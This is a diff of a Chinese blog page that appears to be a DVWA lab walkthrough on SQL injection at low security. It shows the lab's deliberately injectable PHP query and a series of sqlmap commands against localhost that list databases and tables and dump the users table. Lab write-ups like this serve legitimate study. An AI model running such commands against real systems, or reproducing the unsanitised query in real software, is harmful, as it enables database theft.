@@ -428,9 +428,6 @@
 </ol>
 <h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">        $last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
 <h3 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h3><ol>
 <li><p>输入<code>&#39;</code>,发现有报错,说明很可能有sql注入</p>
 </li>
@@ -495,47 +492,42 @@
 </li>
 <li><p>打开sqlmap,输入</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>
-
 <p>康康有没有sql注入</p>
 <ul>
 <li>-u参数指定目标URL</li>
-<li>–batch参数采用默认选项,不进行询问</li>
-<li>–cookie参数指定cookie</li>
+<li>—batch参数采用默认选项,不进行询问</li>
+<li>—cookie参数指定cookie</li>
 </ul>
 <p>可以看到是存在注入的</p>
 <p><img src="Snipaste_2020-04-15_17-13-57.png" alt="Snipaste_2020-04-15_17-13-57"></p>
 </li>
 <li><p>查看所有的数据库</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span> <span class="params">--dbs</span></span><br></pre></td></tr></table></figure>
-
 <ul>
-<li>–dbs所有数据库</li>
+<li>—dbs所有数据库</li>
 </ul>
 <p><img src="Snipaste_2020-04-15_17-15-16.png" alt="Snipaste_2020-04-15_17-15-16"></p>
 </li>
 <li><p>所以我们要用的应该是dvwa那个库,然后康康里面有什么表</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="params">--cookie=</span><span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> <span class="params">--batch</span> -D dvwa <span class="params">--tables</span></span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>-D参数指定为dvwa数据库</li>
-<li>–tables参数查看所有的表</li>
+<li>—tables参数查看所有的表</li>
 </ul>
 <p><img src="image-20200415171817802.png" alt="image-20200415171817802"></p>
 </li>
 <li><p>查看users表中的列</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="attribute">--cookie</span>=<span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> --batch -D dvwa -T<span class="built_in"> users </span>--columns</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>-T参数指定表为users</li>
-<li>–columns查看该表的所有列</li>
+<li>—columns查看该表的所有列</li>
 </ul>
 <p><img src="image-20200415172014493.png" alt="image-20200415172014493"></p>
 </li>
 <li><p>最后看看整个表中都有什么</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> <span class="attribute">--cookie</span>=<span class="string">"security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1"</span> --batch -D dvwa -T<span class="built_in"> users </span>--dump</span><br></pre></td></tr></table></figure>
-
 <ul>
-<li>–dump参数将所有列的信息都列出来</li>
+<li>—dump参数将所有列的信息都列出来</li>
 </ul>
 <p><img src="image-20200415172329770.png" alt="image-20200415172329770"></p>
 </li>
@@ -1153,7 +1145,7 @@ if(canvas.getContext){
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">51.2k</span>
+    <span title="Site words total count">50.1k</span>
   
 </div>
 
